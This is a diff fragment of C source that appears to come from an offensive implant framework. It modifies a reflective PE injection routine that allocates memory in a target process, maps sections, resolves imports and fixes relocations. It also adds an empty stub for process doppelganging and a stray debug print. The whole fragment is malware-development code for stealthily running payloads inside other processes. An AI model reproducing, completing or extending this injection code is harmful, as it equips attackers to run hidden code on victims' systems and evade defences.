@@ -66,12 +66,17 @@ _Leave:
     return bkErrorCode;
 }
 
+FUNC VOID InjectionDoppelganging(
+
+) {
+
+}
+
 FUNC PVOID InjectionReflective(
     _In_ HANDLE ProcessHandle,
     _In_ PBYTE  PeBytes,
     _In_ UINT64 PeSize,
-    _In_ PSTR   Args,
-    _In_ BOOL   IsDll
+    _In_ PSTR   Args
 ) {
     BLACKOUT_INSTANCE
 
@@ -85,9 +90,11 @@ FUNC PVOID InjectionReflective(
     PIMAGE_DATA_DIRECTORY EntryReloc  = { 0 };
     PIMAGE_DATA_DIRECTORY EntryExcept = { 0 };
     PIMAGE_DATA_DIRECTORY EntryTls    = { 0 };
+    PIMAGE_DATA_DIRECTORY EntryExport = { 0 };
     UINT32                ImageSize   = 0;
     UINT32                bkErrorCode = 0;
     UINT32                RelocOffset = 0;
+    BOOL                  IsDll       = FALSE;
 
     ImgNtHdrs   = U_PTR( PeBytes ) + ( ( PIMAGE_DOS_HEADER )( PeBytes ) )->e_lfanew;
     ImgSecHdr   = IMAGE_FIRST_SECTION( ImgNtHdrs );
@@ -96,7 +103,10 @@ FUNC PVOID InjectionReflective(
     EntryReloc  = &ImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
     EntryExcept = &ImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION];
     EntryTls    = &ImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];
-    
+    EntryExport = &ImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
+
+    if ( ImgNtHdrs->FileHeader.Characteristics & IMAGE_FILE_DLL ) IsDll = TRUE;
+
     bkMemAlloc( ProcessHandle, &BaseAddress, ImageSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
 
     for ( INT i = 0; i < ImgNtHdrs->FileHeader.NumberOfSections; i++ ) {
@@ -108,8 +118,11 @@ FUNC PVOID InjectionReflective(
     }
 
     RelocOffset = U_PTR( BaseAddress ) - ImgNtHdrs->OptionalHeader.ImageBase;
+
     ResolveIat( EntryImport, BaseAddress );
     FixRelocTable( EntryReloc, BaseAddress, RelocOffset );
+
+    BK_PRINT( "aaa\n" );
 
     for ( int i = 0; i < ImgNtHdrs->FileHeader.NumberOfSections; i++ ) {
 
